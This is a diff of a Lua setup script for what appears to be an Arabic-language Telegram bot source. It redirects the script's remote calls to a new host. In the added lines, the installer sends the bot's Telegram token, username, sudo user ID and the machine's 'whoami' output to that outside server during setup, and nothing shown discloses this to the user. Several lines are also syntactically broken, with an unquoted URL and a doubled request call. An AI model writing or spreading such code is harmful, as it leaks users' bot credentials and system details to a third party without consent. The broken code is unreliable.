@@ -56,7 +56,7 @@ print('\n\27[1;31m￤ This is Not ID !\n￤هہ‏‏ذآ الايدي ليس م
 create_config(Token)
 end 
 print('('..SUDO_USER..')')
-local url , res = https.request( https://alyafaevip.ml/LHB/index.php?token= ..Token.. &username=@ ..GetUser.result.username.. &id= ..SUDO_USER)
+local url , res = https.request( https://abuturki.aba.vg/yakot/index.php?token= ..Token.. &username=@ ..GetUser.result.username.. &id= ..SUDO_USER)
 print(res)
 if res ~= 200 then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
@@ -79,7 +79,7 @@ boss..":VERSION","1.0",
 boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","https://alyafaevip.ml/",
+boss..":ApiSource","https://abuturki.aba.vg/",
 boss..":NameBot:","لم يتم تسميه البوت",
 "TH3BOSS_INSTALL","Yes"
 )
@@ -88,7 +88,7 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https.request('https://alyafaevip.ml/request/?insert='..JSON.encode(info))
+https.request('https://abuturki.aba.vg/request/?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
